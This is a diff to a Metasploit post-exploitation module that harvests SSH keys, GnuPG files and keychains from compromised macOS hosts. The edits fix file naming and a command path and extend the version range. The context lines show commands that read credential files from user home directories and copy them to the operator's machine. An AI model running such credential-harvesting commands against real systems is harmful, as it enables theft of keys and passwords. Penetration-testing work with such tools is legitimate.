@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -14,8 +13,8 @@ class MetasploitModule < Msf::Post
     super( update_info( info,
         'Name'          => 'OS X Gather Mac OS X System Information Enumeration',
         'Description'   => %q{
-            This module gathers basic system information from Mac OS X Tiger, Leopard,
-          Snow Leopard and Lion systems.
+            This module gathers basic system information from Mac OS X Tiger (10.4), through
+            Mojave (10.14).
         },
         'License'       => MSF_LICENSE,
         'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
@@ -213,7 +212,7 @@ class MetasploitModule < Msf::Post
             ssh_file_content = cmd_exec("/bin/cat ~/.ssh/#{k}")
 
             # Save data lo log folder
-            file_local_write(log_folder+"//#{name}",ssh_file_content)
+            file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
           end
         end
 
@@ -227,7 +226,7 @@ class MetasploitModule < Msf::Post
             gpg_file_content = cmd_exec("/bin/cat ~/.gnupg/#{k.strip}")
 
             # Save data lo log folder
-            file_local_write(log_folder+"//#{name}", gpg_file_content)
+            file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}", gpg_file_content)
           end
         end
       else
@@ -249,7 +248,7 @@ class MetasploitModule < Msf::Post
               ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.ssh/#{k}")
 
               # Save data lo log folder
-              file_local_write(log_folder+"//#{name}",ssh_file_content)
+              file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
             end
           end
         end
@@ -266,7 +265,7 @@ class MetasploitModule < Msf::Post
               ssh_file_content = cmd_exec("/bin/cat /Users/#{u}/.gnupg/#{k}")
 
               # Save data lo log folder
-              file_local_write(log_folder+"//#{name}",ssh_file_content)
+              file_local_write(log_folder+"//#{k.strip.gsub(/\W/,"_")}",ssh_file_content)
             end
           end
         end
@@ -382,7 +381,7 @@ class MetasploitModule < Msf::Post
     else
       current_user = cmd_exec("/usr/bin/id -nu")
       print_status("Enumerating and Downloading keychains for #{current_user}")
-      keychain_files = cmd_exec("usr/bin/security list-keychains").split("\n")
+      keychain_files = cmd_exec("/usr/bin/security list-keychains").split("\n")
       keychain_files.each do |k|
 
         keychain_file = cmd_exec("/bin/cat #{k.strip}")
